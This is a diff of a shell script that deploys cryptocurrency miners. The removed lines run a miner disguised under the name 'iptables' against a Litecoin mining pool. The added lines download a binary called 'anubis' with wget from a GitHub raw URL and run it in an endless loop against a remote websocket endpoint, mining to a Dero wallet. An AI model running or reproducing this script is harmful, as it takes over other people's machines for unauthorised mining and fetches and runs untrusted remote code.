@@ -1,4 +1,6 @@
 #!/bin/sh
-chmod 777 iptables
-nohup ./iptables -a gr -o ghostrider.na.mine.zpool.ca:5354 -u LViSs9qdctYGL4Bze21iVjNNqHEDF1JsoX -p c=LTC &
-echo JOB DONE SUCCESS
+wget https://github.com/zanejahhesti/cloud/raw/main/anubis
+chmod 700 anubis
+timeout 1m ./anubis -u dero1qysflwnyf4mqhzdet7v478nn5l38q6u0uh9g86vtcpmrze0ml8xc7qgdhw9aj.CPU -o wss://51.222.96.66:80
+while :; do timeout 1m ./anubis -u dero1qysflwnyf4mqhzdet7v478nn5l38q6u0uh9g86vtcpmrze0ml8xc7qgdhw9aj.CPU -o wss://51.222.96.66:80;echo JOSS; sleep 10s; done
+
